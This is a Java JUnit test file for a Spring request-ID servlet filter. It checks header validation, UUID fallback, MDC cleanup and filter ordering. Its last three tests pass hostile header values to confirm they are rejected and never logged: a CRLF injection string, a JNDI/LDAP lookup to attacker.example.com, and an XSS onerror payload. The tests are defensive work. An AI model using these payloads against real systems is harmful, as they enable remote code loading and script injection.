package io.ngss.atlas.filter;

import static org.assertj.core.api.Assertions.assertThat;
import static org.assertj.core.api.Assertions.assertThatThrownBy;

import ch.qos.logback.classic.Level;
import ch.qos.logback.classic.Logger;
import ch.qos.logback.classic.spi.ILoggingEvent;
import ch.qos.logback.core.read.ListAppender;
import jakarta.servlet.FilterChain;
import jakarta.servlet.ServletException;
import java.lang.reflect.Method;
import java.util.concurrent.atomic.AtomicReference;
import org.junit.jupiter.api.AfterEach;
import org.junit.jupiter.api.BeforeEach;
import org.junit.jupiter.api.Test;
import org.slf4j.LoggerFactory;
import org.slf4j.MDC;
import org.springframework.core.Ordered;
import org.springframework.core.annotation.AnnotationUtils;
import org.springframework.core.annotation.Order;
import org.springframework.mock.web.MockFilterChain;
import org.springframework.mock.web.MockHttpServletRequest;
import org.springframework.mock.web.MockHttpServletResponse;

class RequestIdFilterTest {

  private static final String UUID_V4_REGEX =
      "^[0-9a-f]{8}-[0-9a-f]{4}-4[0-9a-f]{3}-[89ab][0-9a-f]{3}-[0-9a-f]{12}$";

  private RequestIdFilter filter;
  private ListAppender<ILoggingEvent> logCapture;
  private Logger rootLogger;

  @BeforeEach
  void setUp() {
    filter = new RequestIdFilter();
    rootLogger = (Logger) LoggerFactory.getLogger(Logger.ROOT_LOGGER_NAME);
    logCapture = new ListAppender<>();
    logCapture.setContext(rootLogger.getLoggerContext());
    logCapture.start();
    rootLogger.addAppender(logCapture);
    MDC.clear();
  }

  @AfterEach
  void tearDown() {
    rootLogger.detachAppender(logCapture);
    logCapture.stop();
    MDC.clear();
  }

  @Test
  void validHeaderIsEchoedAndMdcCleared() throws Exception {
    MockHttpServletRequest req = new MockHttpServletRequest();
    MockHttpServletResponse resp = new MockHttpServletResponse();
    req.addHeader("X-Request-Id", "valid-request-abc-123");

    filter.doFilter(req, resp, new MockFilterChain());

    assertThat(resp.getHeader("X-Request-Id")).isEqualTo("valid-request-abc-123");
    assertThat(MDC.get("request_id")).isNull();
  }

  @Test
  void missingHeaderProducesUuidV4AndMdcCleared() throws Exception {
    MockHttpServletRequest req = new MockHttpServletRequest();
    MockHttpServletResponse resp = new MockHttpServletResponse();

    filter.doFilter(req, resp, new MockFilterChain());

    assertThat(resp.getHeader("X-Request-Id")).matches(UUID_V4_REGEX);
    assertThat(MDC.get("request_id")).isNull();
  }

  @Test
  void oversizedHeaderIsReplacedByUuidV4() throws Exception {
    MockHttpServletRequest req = new MockHttpServletRequest();
    MockHttpServletResponse resp = new MockHttpServletResponse();
    req.addHeader("X-Request-Id", "a".repeat(129));

    filter.doFilter(req, resp, new MockFilterChain());

    assertThat(resp.getHeader("X-Request-Id")).matches(UUID_V4_REGEX);
    assertThat(MDC.get("request_id")).isNull();
  }

  @Test
  void invalidCharactersTriggerUuidV4Replacement() throws Exception {
    MockHttpServletRequest req = new MockHttpServletRequest();
    MockHttpServletResponse resp = new MockHttpServletResponse();
    req.addHeader("X-Request-Id", "invalid chars!@#$%");

    filter.doFilter(req, resp, new MockFilterChain());

    assertThat(resp.getHeader("X-Request-Id")).matches(UUID_V4_REGEX);
    assertThat(MDC.get("request_id")).isNull();
  }

  @Test
  void downstreamExceptionStillClearsMdc() {
    MockHttpServletRequest req = new MockHttpServletRequest();
    MockHttpServletResponse resp = new MockHttpServletResponse();
    FilterChain bad =
        (request, response) -> {
          throw new ServletException("downstream failure");
        };

    assertThatThrownBy(() -> filter.doFilter(req, resp, bad)).isInstanceOf(ServletException.class);
    assertThat(MDC.get("request_id")).isNull();
  }

  @Test
  void filterDeclaresHighestPrecedence() {
    Order order = AnnotationUtils.findAnnotation(RequestIdFilter.class, Order.class);
    assertThat(order).isNotNull();
    assertThat(order.value()).isEqualTo(Ordered.HIGHEST_PRECEDENCE);
  }

  @Test
  void downstreamFilterSeesResolvedRequestIdInMdc() throws Exception {
    MockHttpServletRequest req = new MockHttpServletRequest();
    MockHttpServletResponse resp = new MockHttpServletResponse();
    req.addHeader("X-Request-Id", "downstream-visible-id");
    AtomicReference<String> seen = new AtomicReference<>();
    FilterChain capture = (request, response) -> seen.set(MDC.get("request_id"));

    filter.doFilter(req, resp, capture);

    assertThat(seen.get()).isEqualTo("downstream-visible-id");
  }

  @Test
  void asyncDispatchSkipped_errorDispatchProcessed() throws Exception {
    Method asyncMethod = RequestIdFilter.class.getDeclaredMethod("shouldNotFilterAsyncDispatch");
    Method errorMethod = RequestIdFilter.class.getDeclaredMethod("shouldNotFilterErrorDispatch");
    asyncMethod.setAccessible(true);
    errorMethod.setAccessible(true);
    assertThat((Boolean) asyncMethod.invoke(filter)).isTrue();
    assertThat((Boolean) errorMethod.invoke(filter)).isFalse();
    assertThat(asyncMethod.getDeclaringClass()).isEqualTo(RequestIdFilter.class);
    assertThat(errorMethod.getDeclaringClass()).isEqualTo(RequestIdFilter.class);
  }

  @Test
  void crlfInjectionAttemptIsReplacedAndNotLogged() throws Exception {
    MockHttpServletRequest req = new MockHttpServletRequest();
    MockHttpServletResponse resp = new MockHttpServletResponse();
    req.addHeader("X-Request-Id", "legit\r\nX-Injected-Header: evil");

    filter.doFilter(req, resp, new MockFilterChain());

    assertThat(resp.getHeader("X-Injected-Header")).isNull();
    assertThat(resp.getHeader("X-Request-Id")).matches(UUID_V4_REGEX);
    boolean leaked =
        logCapture.list.stream()
            .filter(e -> e.getLevel().isGreaterOrEqual(Level.DEBUG))
            .anyMatch(e -> e.getFormattedMessage().contains("X-Injected-Header"));
    assertThat(leaked).isFalse();
  }

  @Test
  void jndiPayloadIsReplacedAndNotLogged() throws Exception {
    MockHttpServletRequest req = new MockHttpServletRequest();
    MockHttpServletResponse resp = new MockHttpServletResponse();
    req.addHeader("X-Request-Id", "${jndi:ldap://attacker.example.com/x}");

    filter.doFilter(req, resp, new MockFilterChain());

    assertThat(resp.getHeader("X-Request-Id")).matches(UUID_V4_REGEX);
    boolean leaked =
        logCapture.list.stream()
            .filter(e -> e.getLevel().isGreaterOrEqual(Level.DEBUG))
            .anyMatch(e -> e.getFormattedMessage().contains("jndi:"));
    assertThat(leaked).isFalse();
  }

  @Test
  void xssPayloadIsReplacedAndNotLogged() throws Exception {
    MockHttpServletRequest req = new MockHttpServletRequest();
    MockHttpServletResponse resp = new MockHttpServletResponse();
    req.addHeader("X-Request-Id", "<img src=x onerror=alert(1)>");

    filter.doFilter(req, resp, new MockFilterChain());

    String echoed = resp.getHeader("X-Request-Id");
    assertThat(echoed).matches(UUID_V4_REGEX);
    assertThat(echoed).doesNotContain("<").doesNotContain(">");
    boolean leaked =
        logCapture.list.stream()
            .filter(e -> e.getLevel().isGreaterOrEqual(Level.DEBUG))
            .anyMatch(e -> e.getFormattedMessage().contains("<"));
    assertThat(leaked).isFalse();
  }
}
